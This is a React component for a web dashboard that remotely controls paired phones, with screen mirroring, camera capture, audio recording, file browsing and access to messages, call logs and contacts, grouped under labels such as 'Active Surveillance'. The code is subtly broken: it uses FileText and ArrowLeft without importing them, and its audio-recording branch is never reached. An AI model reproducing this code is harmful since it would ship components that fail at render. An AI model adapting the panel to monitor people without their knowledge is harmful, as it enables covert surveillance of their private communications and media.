import axios from 'axios';
import {
    AlertCircle,
    BatteryMedium,
    Bell,
    Camera,
    CheckCircle,
    ChevronRight,
    Cpu,
    Download,
    Folder,
    Image,
    LayoutGrid,
    MessageSquare,
    Monitor,
    Phone,
    Play,
    QrCode,
    RefreshCw,
    Smartphone,
    Square,
    Trash2,
    User,
    Wifi,
    WifiOff,
    Zap
} from 'lucide-react';
import { useEffect, useState } from 'react';
import { io } from 'socket.io-client';

const API_URL = import.meta.env.VITE_API_URL || 'http://localhost:5000';

export default function Controlled() {
  const [devices, setDevices] = useState([]);
  const [selectedDevice, setSelectedDevice] = useState(null);
  const [session, setSession] = useState(null);
  const [socket, setSocket] = useState(null);
  const [screenFrame, setScreenFrame] = useState(null);
  const [loading, setLoading] = useState(false);
  const [showDownloadModal, setShowDownloadModal] = useState(false);
  const [notificationsList, setNotificationsList] = useState([]);
  const [showNotificationsModal, setShowNotificationsModal] = useState(false);
  const [lastCommandStatus, setLastCommandStatus] = useState(null);
  const [systemStats, setSystemStats] = useState({ battery: 0, storageUsed: 0, storageAvailable: 0 });
  const [files, setFiles] = useState([]);
  const [showFileExplorer, setShowFileExplorer] = useState(false);
  const [currentPath, setCurrentPath] = useState(null);
  const [capturedPhoto, setCapturedPhoto] = useState(null);
  const [recordedAudio, setRecordedAudio] = useState(null);

  useEffect(() => {
    fetchDevices();
  }, []);

  useEffect(() => {
    if (socket && session) {
      const interval = setInterval(() => {
        sendCommand('GET_STATS');
      }, 10000);
      return () => clearInterval(interval);
    }
  }, [socket, session]);

  const fetchDevices = async () => {
    try {
      const token = localStorage.getItem('access_token');
      const response = await axios.get(`${API_URL}/remote-control/devices`, {
        headers: { Authorization: `Bearer ${token}` },
      });
      setDevices(response.data);
    } catch (error) {
      console.error('Error fetching devices:', error);
    }
  };

  const connectToDevice = async (deviceId) => {
    setLoading(true);
    try {
      const token = localStorage.getItem('access_token');
      const newSocket = io(`${API_URL}/remote-control`, {
        auth: { token },
      });

      setSocket(newSocket);

      const startSession = () => {
        newSocket.emit('session:start', { deviceId }, (response) => {
          if (response.success) {
            setSession(response.session);
            setSelectedDevice(deviceId);
          } else {
            alert('Failed to start session: ' + response.error);
          }
          setLoading(false);
        });
      };

      if (newSocket.connected) {
        startSession();
      } else {
        newSocket.on('connect', () => {
          console.log('Socket connected, starting session...');
          startSession();
        });
      }

      newSocket.on('session:status', (data) => {
        if (data.accepted) {
          console.log('Session accepted!');
        } else {
          alert('Device rejected the connection');
          disconnectFromDevice();
        }
      });

      newSocket.on('screen:frame', (data) => {
        setScreenFrame(data.frame);
      });

      newSocket.on('command:completed', (data) => {
        console.log('Command completed:', data);
        setLastCommandStatus(data);
        
        if (data.type === 'GET_NOTIFICATIONS' && data.result) {
          setNotificationsList(data.result);
          setShowNotificationsModal(true);
        }

        if (data.type === 'GET_STATS' && data.result) {
          setSystemStats(data.result);
        }

        if (data.type === 'GET_FILES' && data.result) {
          setFiles(data.result);
          setShowFileExplorer(true);
        }

        if (data.type === 'CAMERA_CAPTURE' && data.result) {
          setCapturedPhoto(`data:image/jpeg;base64,${data.result}`);
        }

        if (data.type === 'AUDIO_RECORD' && data.result) {
           const audioBlob = new Audio(`data:audio/mp4;base64,${data.result}`);
           audioBlob.play();
           alert('Audio recording received and playing...');
        }
      });
    } catch (error) {
      console.error('Error connecting to device:', error);
      setLoading(false);
    }
  };

  const disconnectFromDevice = () => {
    if (socket) {
      socket.disconnect();
      setSocket(null);
    }
    setSession(null);
    setSelectedDevice(null);
    setScreenFrame(null);
  };

  const sendCommand = (type, payload = {}) => {
    if (!socket || !session) return;

    socket.emit(
      'command:send',
      {
        sessionId: session.id,
        type,
        payload,
      },
      (response) => {
        if (!response.success) {
          alert('Command failed: ' + response.error);
        }
      }
    );
  };

  const browseFiles = (path = null) => {
    sendCommand('GET_FILES', { path });
    if (path) setCurrentPath(path);
  };

  const deleteDevice = async (deviceId) => {
    if (!confirm('Are you sure you want to remove this device?')) return;

    try {
      const token = localStorage.getItem('access_token');
      await axios.delete(`${API_URL}/remote-control/devices/${deviceId}`, {
        headers: { Authorization: `Bearer ${token}` },
      });
      fetchDevices();
    } catch (error) {
      console.error('Error deleting device:', error);
    }
  };

  const formatLastSeen = (date) => {
    const now = new Date();
    const lastSeen = new Date(date);
    const diff = Math.floor((now - lastSeen) / 1000);

    if (diff < 60) return 'Just now';
    if (diff < 3600) return `${Math.floor(diff / 60)}m ago`;
    if (diff < 86400) return `${Math.floor(diff / 3600)}h ago`;
    return `${Math.floor(diff / 86400)}d ago`;
  };

  if (session) {
    const categories = [
      {
        title: 'Central Communications',
        desc: 'Contacts, messages, and call management',
        color: 'blue',
        actions: [
          { id: 'messages', label: 'Message Portal', icon: <MessageSquare size={18} />, action: 'messages' },
          { id: 'call_logs', label: 'Call History', icon: <Phone size={18} />, action: 'call_logs' },
          { id: 'contacts', label: 'Contact Vault', icon: <User size={18} />, action: 'contacts' },
        ],
      },
      {
        title: 'Active Surveillance',
        desc: 'Camera access and live media sync',
        color: 'purple',
        actions: [
          { id: 'camera', label: 'Live Camera', icon: <Camera size={18} />, action: 'camera' },
          { id: 'photos', label: 'Image Gallery', icon: <Image size={18} />, action: 'gallery' },
          { id: 'files', label: 'File Browser', icon: <Folder size={18} />, action: 'files' },
        ],
      },
      {
        title: 'Core System Control',
        desc: 'Apps, hardware, and notifications',
        color: 'emerald',
        actions: [
          { id: 'apps', label: 'App Manager', icon: <LayoutGrid size={18} />, action: 'apps' },
          { id: 'notifications', label: 'Sync Alerts', icon: <Bell size={18} />, altType: 'GET_NOTIFICATIONS' },
          { id: 'vibrate', label: 'Test Haptics', icon: <Zap size={18} />, action: 'vibrate' },
        ],
      },
    ];

    return (
      <div 
        className="relative min-h-[calc(100vh-80px)] bg-[#020617] text-slate-100 flex flex-col overflow-hidden rounded-[2.5rem] mt-4 shadow-2xl border border-slate-800/50"
        style={{
          backgroundImage: 'radial-gradient(circle at top right, rgba(29, 78, 216, 0.15), transparent), radial-gradient(circle at bottom left, rgba(126, 34, 206, 0.1), transparent)'
        }}
      >
        {/* Modern Header */}
        <nav className="h-16 flex items-center justify-between px-8 border-b border-slate-800/50 backdrop-blur-md bg-slate-900/40 z-50">
          <div className="flex items-center gap-4">
            <div className="w-10 h-10 rounded-xl bg-gradient-to-tr from-blue-600 to-indigo-600 flex items-center justify-center shadow-lg shadow-blue-500/20">
              <Zap className="w-5 h-5 text-white fill-white" />
            </div>
            <div>
              <p className="text-xs font-black text-blue-500 uppercase tracking-widest leading-none mb-1">Secure Link</p>
              <h1 className="text-lg font-bold tracking-tight text-white leading-none">
                {devices.find(d => d.id === selectedDevice)?.deviceName || 'CONNECTED_DEVICE'}
              </h1>
            </div>
          </div>

          <div className="flex items-center gap-6">
            <div className="hidden md:flex items-center gap-4 text-slate-400">
               <div className="flex flex-col items-end">
                  <span className="text-[10px] font-bold uppercase text-slate-500">System Status</span>
                  <span className="text-xs font-semibold text-emerald-400">ENCRYPTED_ONLINE</span>
               </div>
               <div className="h-8 w-px bg-slate-800"></div>
            </div>
            <button 
              onClick={disconnectFromDevice}
              className="px-5 py-2 rounded-xl bg-red-500/10 hover:bg-red-500 text-red-500 hover:text-white border border-red-500/20 transition-all font-bold text-sm"
            >
              Terminate Session
            </button>
          </div>
        </nav>

        <div className="flex-1 flex flex-col lg:flex-row gap-8 p-8 overflow-y-auto custom-scrollbar">
          
          {/* Left Panel: The Device Display */}
          <div className="lg:w-[400px] shrink-0">
            <div className="sticky top-0">
              {/* Phone Frame Mockup */}
              <div className="relative mx-auto w-full max-w-[320px] aspect-[9/18.5] bg-slate-900 rounded-[3rem] p-3 border-4 border-slate-800 shadow-2xl overflow-hidden shadow-blue-900/10">
                <div className="absolute top-0 left-1/2 -translate-x-1/2 w-32 h-6 bg-slate-900 rounded-b-3xl z-30"></div>
                <div className="w-full h-full rounded-[2.5rem] bg-slate-950 overflow-hidden relative border border-slate-800/50">
                  {screenFrame ? (
                    <img 
                      src={`data:image/jpeg;base64,${screenFrame}`} 
                      className="w-full h-full object-cover" 
                      alt="Stream" 
                    />
                  ) : (
                    <div className="w-full h-full flex flex-col items-center justify-center gap-4 p-8 text-center">
                      <div className="w-16 h-16 rounded-full bg-slate-900 flex items-center justify-center border border-slate-800 animate-pulse">
                        <Monitor className="w-6 h-6 text-slate-700" />
                      </div>
                      <div>
                        <h3 className="text-sm font-bold text-slate-400 mb-1">Display Inactive</h3>
                        <p className="text-[10px] text-slate-600">Mirroring current halted by remote policy</p>
                      </div>
                    </div>
                  )}
                </div>
              </div>

              {/* Mirror Toggle Button */}
              <button 
                onClick={() => screenFrame ? sendCommand('SCREEN_SHARE_STOP') : sendCommand('SCREEN_SHARE_START')}
                className={`mt-6 w-full py-4 rounded-2xl flex items-center justify-center gap-3 font-bold transition-all shadow-xl active:scale-95 ${
                  screenFrame 
                    ? 'bg-slate-800 text-red-400 border border-red-500/20' 
                    : 'bg-blue-600 hover:bg-blue-500 text-white shadow-blue-600/20'
                }`}
              >
                {screenFrame ? <Square size={20} fill="currentColor" /> : <Play size={20} fill="currentColor" />}
                {screenFrame ? 'Disable Mirroring' : 'Initiate Mirroring'}
              </button>

              {/* Hardware Stats */}
              <div className="grid grid-cols-2 gap-4 mt-8">
                <div className="bg-slate-900/60 p-5 rounded-2xl border border-white/5 backdrop-blur-xl">
                   <div className="flex justify-between items-center mb-1">
                      <span className="text-[10px] font-black text-slate-500 uppercase tracking-widest">Battery</span>
                      <BatteryMedium className={`w-4 h-4 ${systemStats.battery > 20 ? 'text-emerald-500' : 'text-rose-500 animate-pulse'}`} />
                   </div>
                   <p className="text-2xl font-bold text-white">{systemStats.battery || 0}<span className="text-xs text-slate-500">%</span></p>
                </div>
                <div className="bg-slate-900/60 p-5 rounded-2xl border border-white/5 backdrop-blur-xl">
                   <div className="flex justify-between items-center mb-1">
                      <span className="text-[10px] font-black text-slate-500 uppercase tracking-widest">Network</span>
                      <Wifi className="w-4 h-4 text-blue-500" />
                   </div>
                   <p className="text-sm font-bold text-white">CONNECTED</p>
                </div>
              </div>
            </div>
          </div>

          {/* Right Panel: Control Dashboard */}
          <div className="flex-1 space-y-12">
            
            {/* Command Intelligence Card */}
            <div className="relative group">
              <div className="absolute -inset-1 bg-gradient-to-r from-blue-600 to-indigo-600 rounded-[2.5rem] blur opacity-10 group-hover:opacity-20 transition duration-1000"></div>
              <div className="relative bg-slate-900/60 backdrop-blur-3xl border border-white/5 p-8 rounded-[2.5rem] shadow-2xl">
                 <div className="flex flex-col md:flex-row md:items-center justify-between gap-6 mb-8">
                    <div>
                       <h2 className="text-2xl font-bold text-white tracking-tight mb-1">Command Dashboard</h2>
                       <p className="text-slate-500 text-sm">Full administrative override active for this terminal.</p>
                    </div>
                    <div className="flex -space-x-2">
                       {[1,2,3].map(i => <div key={i} className={`w-8 h-8 rounded-full border-2 border-slate-900 bg-slate-800 flex items-center justify-center text-[10px] font-bold text-slate-500 transition-colors hover:text-blue-400`}>OP{i}</div>)}
                    </div>
                 </div>

                 <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
                    {categories.map((cat, i) => (
                      <div key={i} className="space-y-4">
                         <div className="px-2">
                            <h3 className="text-xs font-black text-slate-500 uppercase tracking-[0.2em] mb-1">{cat.title}</h3>
                            <p className="text-[10px] text-slate-600 font-medium">{cat.desc}</p>
                         </div>
                         <div className="space-y-2">
                            {cat.actions.map(act => (
                              <button
                                key={act.id}
                                onClick={() => {
                                  if (act.action === 'gallery' || act.action === 'files') {
                                    browseFiles();
                                  } else if (act.action === 'camera') {
                                    sendCommand('CAMERA_CAPTURE');
                                  } else if (act.action === 'mic') {
                                    sendCommand('AUDIO_RECORD');
                                  } else if (act.altType) {
                                    sendCommand(act.altType);
                                  } else {
                                    sendCommand('CUSTOM', { action: act.action });
                                  }
                                }}
                                className="w-full flex items-center justify-between p-4 bg-slate-800/20 hover:bg-slate-800/60 rounded-2xl border border-white/[0.03] hover:border-blue-500/20 transition-all group/btn"
                              >
                                <div className="flex items-center gap-3">
                                   <div className={`p-2 rounded-lg bg-${cat.color}-500/10 text-${cat.color}-500 group-hover/btn:scale-110 transition-transform`}>
                                      {act.icon}
                                   </div>
                                   <span className="text-xs font-bold text-slate-300 group-hover/btn:text-white">{act.label}</span>
                                </div>
                                <ChevronRight className="w-3.5 h-3.5 text-slate-600 group-hover/btn:translate-x-1 group-hover/btn:text-blue-500 transition-all" />
                              </button>
                            ))}
                         </div>
                      </div>
                    ))}
                 </div>
              </div>
            </div>

            {/* Quick Diagnostic Console */}
            <div className="space-y-4">
               <h3 className="text-xs font-black text-slate-500 uppercase tracking-[0.2em] px-2 flex items-center gap-3">
                  <Cpu className="w-3 h-3" /> System Diagnostics
               </h3>
               <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-4">
                  {[
                    { label: 'BATTERY_HEALTH', val: `${systemStats.battery}%`, color: 'blue' },
                    { label: 'STORAGE_USED', val: `${systemStats.storageUsed}%`, color: 'indigo' },
                    { label: 'FREE_SPACE', val: `${systemStats.storageAvailable} GB`, color: 'purple' },
                    { label: 'SYSTEM_STATUS', val: 'NOMINAL', color: 'emerald' }
                  ].map((stat, i) => (
                    <div key={i} className="bg-slate-900/40 p-5 rounded-[2rem] border border-white/5 flex flex-col gap-1">
                       <span className="text-[10px] font-bold text-slate-600 tracking-wider transition-colors hover:text-slate-400 cursor-default">{stat.label}</span>
                       <span className={`text-lg font-bold text-${stat.color}-400 underline decoration-2 decoration-white/5`}>{stat.val}</span>
                    </div>
                  ))}
               </div>
            </div>

            {/* Utility Shorts */}
            <div className="flex flex-wrap gap-3">
               <button className="px-6 py-2.5 rounded-full bg-slate-800/30 hover:bg-slate-800 border border-white/5 text-[10px] font-bold text-slate-500 hover:text-white transition-all">TERMINATE_ALL_PROCESSES</button>
               <button className="px-6 py-2.5 rounded-full bg-slate-800/30 hover:bg-slate-800 border border-white/5 text-[10px] font-bold text-slate-500 hover:text-white transition-all">WIPE_SYSTEM_CACHE</button>
               <button className="px-6 py-2.5 rounded-full bg-slate-800/30 hover:bg-slate-800 border border-white/5 text-[10px] font-bold text-slate-500 hover:text-white transition-all">REBOOT_INTERFACE</button>
            </div>
          </div>
        </div>

        {/* Taskbar Bottom */}
        <div className="h-10 bg-black/60 backdrop-blur-2xl border-t border-white/5 flex items-center justify-between px-8 z-50">
           <div className="flex items-center gap-6">
              <p className="text-[10px] font-bold text-slate-600 flex items-center gap-1.5 uppercase">
                 <RefreshCw className="w-3 h-3 animate-spin-slow" /> System Relay: Stable
              </p>
           </div>
           {lastCommandStatus && (
              <div className="flex items-center gap-2 px-3 py-1 bg-blue-500/10 rounded-full border border-blue-500/20 animate-pulse">
                <span className="text-[9px] font-bold text-blue-400 uppercase">CMD_EXECUTED: {lastCommandStatus.type}</span>
              </div>
           )}
           <p className="text-[9px] font-black text-slate-700 tracking-[0.3em] uppercase">
              Pro_Infrastucture v2.4.9
           </p>
        </div>

        {/* Notifications Modal */}
        {showNotificationsModal && (
          <div className="fixed inset-0 z-[100] flex items-center justify-center p-6 bg-black/60 backdrop-blur-sm animate-in fade-in duration-300">
            <div className="bg-slate-900/90 border border-white/10 w-full max-w-lg rounded-[2.5rem] shadow-2xl overflow-hidden backdrop-blur-2xl animate-in zoom-in-95 duration-300">
              <div className="p-8">
                <div className="flex items-center justify-between mb-8">
                  <div className="flex items-center gap-4">
                    <div className="w-10 h-10 rounded-xl bg-blue-500/20 flex items-center justify-center">
                      <Bell className="w-5 h-5 text-blue-500" />
                    </div>
                    <h3 className="text-xl font-bold text-white tracking-tight">System Alerts</h3>
                  </div>
                  <button 
                    onClick={() => setShowNotificationsModal(false)}
                    className="w-8 h-8 flex items-center justify-center rounded-full bg-white/5 hover:bg-white/10 text-slate-400 hover:text-white transition-all"
                  >
                    ✕
                  </button>
                </div>

                <div className="space-y-3 max-h-[400px] overflow-y-auto custom-scrollbar pr-2">
                  {notificationsList.length > 0 ? (
                    notificationsList.map((notif, idx) => (
                      <div key={idx} className="p-4 bg-white/5 border border-white/5 rounded-2xl hover:border-blue-500/20 transition-all group">
                         <div className="flex gap-4">
                           <div className="w-2 h-2 mt-2 rounded-full bg-blue-500 animate-pulse"></div>
                           <p className="text-sm text-slate-300 group-hover:text-white transition-colors">{notif}</p>
                         </div>
                      </div>
                    ))
                  ) : (
                    <div className="py-12 text-center">
                      <Bell className="w-12 h-12 text-slate-700 mx-auto mb-4 opacity-20" />
                      <p className="text-slate-500 font-medium">No active alerts found.</p>
                    </div>
                  )}
                </div>

                <button 
                  onClick={() => setShowNotificationsModal(false)}
                  className="mt-8 w-full py-4 rounded-2xl bg-slate-800 hover:bg-slate-700 text-slate-300 font-bold transition-all"
                >
                  Close Terminal
                </button>
              </div>
            </div>
          </div>
        )}

        {/* Captured Photo Overlay */}
        {capturedPhoto && (
          <div className="fixed inset-0 z-[120] flex items-center justify-center p-6 bg-black/95 backdrop-blur-3xl animate-in zoom-in-95 duration-500">
             <div className="relative max-w-4xl w-full">
                <img src={capturedPhoto} className="w-full h-auto rounded-[3rem] shadow-[0_0_100px_rgba(59,130,246,0.3)] border border-white/10" alt="Captured" />
                <button 
                  onClick={() => setCapturedPhoto(null)} 
                  className="absolute -top-12 right-0 px-6 py-2 rounded-full bg-white/10 text-white font-bold hover:bg-white/20 transition-all uppercase tracking-widest text-[10px]"
                >
                  Discard Fragment
                </button>
             </div>
          </div>
        )}

        {/* File Explorer Modal */}
        {showFileExplorer && (
          <div className="fixed inset-0 z-[110] flex items-center justify-center p-6 bg-black/80 backdrop-blur-xl animate-in fade-in duration-300">
            <div className="bg-slate-900/90 border border-white/10 w-full max-w-2xl rounded-[3rem] shadow-2xl overflow-hidden backdrop-blur-3xl flex flex-col max-h-[85vh] animate-in zoom-in-95 duration-300">
               <div className="p-8 border-b border-white/5 flex items-center justify-between">
                  <div className="flex items-center gap-4">
                    <div className="w-12 h-12 rounded-2xl bg-indigo-500/20 flex items-center justify-center">
                      <Folder className="w-6 h-6 text-indigo-500" />
                    </div>
                    <div>
                       <h3 className="text-xl font-black text-white tracking-widest uppercase">Storage Overlook</h3>
                       <p className="text-[10px] text-slate-500 font-bold uppercase tracking-widest">{currentPath || 'ROOT_DIR'}</p>
                    </div>
                  </div>
                  <button onClick={() => setShowFileExplorer(false)} className="w-10 h-10 rounded-full hover:bg-white/10 flex items-center justify-center transition-colors">✕</button>
               </div>
               
               <div className="flex-1 overflow-y-auto p-4 custom-scrollbar">
                  <div className="grid grid-cols-1 gap-2">
                    {files.map((file, idx) => (
                      <div 
                        key={idx} 
                        onClick={() => file.isDir && browseFiles(file.path)}
                        className={`group p-4 rounded-2xl border border-white/[0.03] hover:border-indigo-500/30 transition-all flex items-center justify-between ${file.isDir ? 'bg-indigo-500/5 cursor-pointer' : 'bg-white/[0.02]'}`}
                      >
                         <div className="flex items-center gap-4">
                            <div className={`p-3 rounded-xl ${file.isDir ? 'bg-indigo-500/20 text-indigo-400' : 'bg-slate-700/30 text-slate-500'}`}>
                               {file.isDir ? <Folder className="w-5 h-5" /> : <FileText className="w-5 h-5" />}
                            </div>
                            <div>
                               <p className="text-sm font-bold text-slate-200 group-hover:text-white transition-colors">{file.name}</p>
                               <p className="text-[10px] font-black text-slate-600 uppercase tracking-tighter">
                                  {file.isDir ? 'Directory' : `${(file.size / 1024).toFixed(1)} KB`}
                               </p>
                            </div>
                         </div>
                         {file.isDir && <ChevronRight className="w-4 h-4 text-slate-700 group-hover:text-indigo-500 transition-all" />}
                      </div>
                    ))}
                  </div>
               </div>

               <div className="p-8 bg-black/20 flex justify-between items-center">
                  <button 
                    onClick={() => browseFiles(currentPath?.split('/').slice(0, -1).join('/') || '/')}
                    className="px-6 py-3 rounded-2xl bg-slate-800 text-xs font-bold text-slate-400 hover:text-white transition-colors flex items-center gap-2"
                  >
                     <ArrowLeft className="w-4 h-4" /> Go Back
                  </button>
                  <button onClick={() => setShowFileExplorer(false)} className="px-8 py-3 rounded-2xl bg-indigo-600 text-xs font-bold text-white hover:bg-indigo-500 transition-colors shadow-lg shadow-indigo-500/20">Close Terminal</button>
               </div>
            </div>
          </div>
        )}
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-900 via-purple-900 to-slate-900 p-6">
      <div className="max-w-7xl mx-auto">
        {/* Header */}
        <div className="flex items-center justify-between mb-8">
          <div>
            <h1 className="text-4xl font-bold text-white mb-2">
              Device Control
            </h1>
            <p className="text-purple-300">
              Control your mobile devices from anywhere
            </p>
          </div>
          <button
            onClick={fetchDevices}
            className="flex items-center gap-2 px-4 py-2 bg-purple-600 hover:bg-purple-700 text-white rounded-lg transition-colors"
          >
            <RefreshCw className="w-5 h-5" />
            Refresh
          </button>
        </div>

        {devices.length === 0 ? (
          /* No Devices - Show Download Instructions */
          <div className="bg-white/10 backdrop-blur-lg rounded-2xl p-8 border border-white/20">
            <div className="text-center max-w-2xl mx-auto">
              <div className="w-20 h-20 bg-gradient-to-br from-purple-500 to-pink-500 rounded-full flex items-center justify-center mx-auto mb-6">
                <Smartphone className="w-10 h-10 text-white" />
              </div>

              <h2 className="text-3xl font-bold text-white mb-4">
                Get Started with Remote Control
              </h2>
              <p className="text-purple-200 text-lg mb-8">
                Download our mobile app and control your device from this dashboard
              </p>

              {/* Steps */}
              <div className="grid md:grid-cols-3 gap-6 mb-8">
                <div className="bg-white/5 rounded-xl p-6 border border-purple-400/30">
                  <div className="w-12 h-12 bg-purple-600 rounded-full flex items-center justify-center mx-auto mb-4">
                    <span className="text-white font-bold text-xl">1</span>
                  </div>
                  <h3 className="text-white font-semibold mb-2">Download App</h3>
                  <p className="text-purple-300 text-sm">
                    Install the mobile app on your Android or iOS device
                  </p>
                </div>

                <div className="bg-white/5 rounded-xl p-6 border border-purple-400/30">
                  <div className="w-12 h-12 bg-purple-600 rounded-full flex items-center justify-center mx-auto mb-4">
                    <span className="text-white font-bold text-xl">2</span>
                  </div>
                  <h3 className="text-white font-semibold mb-2">Login</h3>
                  <p className="text-purple-300 text-sm">
                    Use your same account credentials to login
                  </p>
                </div>

                <div className="bg-white/5 rounded-xl p-6 border border-purple-400/30">
                  <div className="w-12 h-12 bg-purple-600 rounded-full flex items-center justify-center mx-auto mb-4">
                    <span className="text-white font-bold text-xl">3</span>
                  </div>
                  <h3 className="text-white font-semibold mb-2">Control</h3>
                  <p className="text-purple-300 text-sm">
                    Your device will appear here and you can control it
                  </p>
                </div>
              </div>

              {/* Download Button */}
              <button
                onClick={() => setShowDownloadModal(true)}
                className="inline-flex items-center gap-3 px-8 py-4 bg-gradient-to-r from-purple-600 to-pink-600 hover:from-purple-700 hover:to-pink-700 text-white rounded-xl font-semibold text-lg transition-all shadow-lg shadow-purple-500/50"
              >
                <Download className="w-6 h-6" />
                Download Mobile App
              </button>

              {/* Info Box */}
              <div className="mt-8 bg-blue-500/10 border border-blue-400/30 rounded-xl p-4">
                <div className="flex items-start gap-3">
                  <AlertCircle className="w-5 h-5 text-blue-400 flex-shrink-0 mt-0.5" />
                  <div className="text-left">
                    <p className="text-blue-200 text-sm">
                      <strong>Important:</strong> Make sure to login with the same email and password you use on this website.
                    </p>
                  </div>
                </div>
              </div>
            </div>
          </div>
        ) : (
          /* Device List */
          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
            {devices.map((device) => (
              <div
                key={device.id}
                className="bg-white/10 backdrop-blur-lg rounded-2xl p-6 border border-white/20 hover:border-purple-400 transition-all"
              >
                <div className="flex items-start justify-between mb-4">
                  <div className="flex items-center gap-3">
                    <div className="w-12 h-12 bg-gradient-to-br from-purple-500 to-pink-500 rounded-xl flex items-center justify-center">
                      <Smartphone className="w-6 h-6 text-white" />
                    </div>
                    <div>
                      <h3 className="text-lg font-semibold text-white">
                        {device.deviceName}
                      </h3>
                      <p className="text-sm text-purple-300">
                        {device.deviceModel || 'Unknown Model'}
                      </p>
                    </div>
                  </div>
                  <button
                    onClick={() => deleteDevice(device.id)}
                    className="text-red-400 hover:text-red-300 transition-colors"
                  >
                    <Trash2 className="w-5 h-5" />
                  </button>
                </div>

                <div className="space-y-2 mb-4">
                  <div className="flex items-center gap-2 text-sm text-purple-200">
                    {device.status === 'ONLINE' ? (
                      <>
                        <Wifi className="w-4 h-4 text-green-400" />
                        <span className="text-green-400 font-medium">Online</span>
                      </>
                    ) : (
                      <>
                        <WifiOff className="w-4 h-4 text-gray-400" />
                        <span className="text-gray-400">Offline</span>
                      </>
                    )}
                  </div>
                  <p className="text-sm text-purple-300">
                    Last seen: {formatLastSeen(device.lastSeen)}
                  </p>
                  {device.osVersion && (
                    <p className="text-sm text-purple-300">
                      OS: {device.osVersion}
                    </p>
                  )}
                </div>

                <button
                  onClick={() => connectToDevice(device.id)}
                  disabled={device.status !== 'ONLINE' || loading}
                  className="w-full flex items-center justify-center gap-2 px-4 py-3 bg-gradient-to-r from-purple-600 to-pink-600 hover:from-purple-700 hover:to-pink-700 text-white rounded-xl font-medium transition-all disabled:opacity-50 disabled:cursor-not-allowed"
                >
                  <Monitor className="w-5 h-5" />
                  {loading ? 'Connecting...' : 'Connect'}
                </button>
              </div>
            ))}

            {/* Add Device Card */}
            <div
              onClick={() => setShowDownloadModal(true)}
              className="bg-white/5 backdrop-blur-lg rounded-2xl p-6 border-2 border-dashed border-purple-400/50 hover:border-purple-400 transition-all cursor-pointer flex flex-col items-center justify-center min-h-[250px]"
            >
              <div className="w-16 h-16 bg-purple-600/20 rounded-full flex items-center justify-center mb-4">
                <Download className="w-8 h-8 text-purple-400" />
              </div>
              <h3 className="text-lg font-semibold text-white mb-2">
                Add New Device
              </h3>
              <p className="text-purple-300 text-sm text-center">
                Download app and login to add more devices
              </p>
            </div>
          </div>
        )}

        {/* Download Modal */}
        {showDownloadModal && (
          <div className="fixed inset-0 bg-black/50 backdrop-blur-sm flex items-center justify-center z-50 p-4">
            <div className="bg-slate-900 rounded-2xl p-8 max-w-md w-full border border-purple-400/30">
              <div className="flex items-center justify-between mb-6">
                <h3 className="text-2xl font-bold text-white">Download App</h3>
                <button
                  onClick={() => setShowDownloadModal(false)}
                  className="text-gray-400 hover:text-white"
                >
                  ✕
                </button>
              </div>

              <div className="space-y-4">
                {/* Android Download */}
                <a
                  href="#"
                  className="block bg-gradient-to-r from-green-600 to-green-700 hover:from-green-700 hover:to-green-800 rounded-xl p-4 transition-all"
                >
                  <div className="flex items-center gap-4">
                    <div className="w-12 h-12 bg-white rounded-xl flex items-center justify-center">
                      <span className="text-2xl">🤖</span>
                    </div>
                    <div className="flex-1">
                      <h4 className="text-white font-semibold">Android</h4>
                      <p className="text-green-200 text-sm">Download APK</p>
                    </div>
                    <Download className="w-5 h-5 text-white" />
                  </div>
                </a>

                {/* iOS Download */}
                <a
                  href="#"
                  className="block bg-gradient-to-r from-blue-600 to-blue-700 hover:from-blue-700 hover:to-blue-800 rounded-xl p-4 transition-all"
                >
                  <div className="flex items-center gap-4">
                    <div className="w-12 h-12 bg-white rounded-xl flex items-center justify-center">
                      <span className="text-2xl">🍎</span>
                    </div>
                    <div className="flex-1">
                      <h4 className="text-white font-semibold">iOS</h4>
                      <p className="text-blue-200 text-sm">Download from App Store</p>
                    </div>
                    <Download className="w-5 h-5 text-white" />
                  </div>
                </a>

                {/* QR Code Option */}
                <div className="bg-white/5 rounded-xl p-4 text-center">
                  <QrCode className="w-16 h-16 text-purple-400 mx-auto mb-2" />
                  <p className="text-purple-300 text-sm">
                    Scan QR code to download
                  </p>
                </div>

                {/* Instructions */}
                <div className="bg-purple-500/10 border border-purple-400/30 rounded-xl p-4">
                  <div className="flex items-start gap-2">
                    <CheckCircle className="w-5 h-5 text-purple-400 flex-shrink-0 mt-0.5" />
                    <div>
                      <p className="text-purple-200 text-sm">
                        After installing, login with your current credentials:
                      </p>
                      <p className="text-purple-300 text-sm mt-2 font-mono bg-black/30 px-2 py-1 rounded">
                        {JSON.parse(localStorage.getItem('user') || '{}').email || 'your-email@example.com'}
                      </p>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        )}
      </div>
    </div>
  );
}
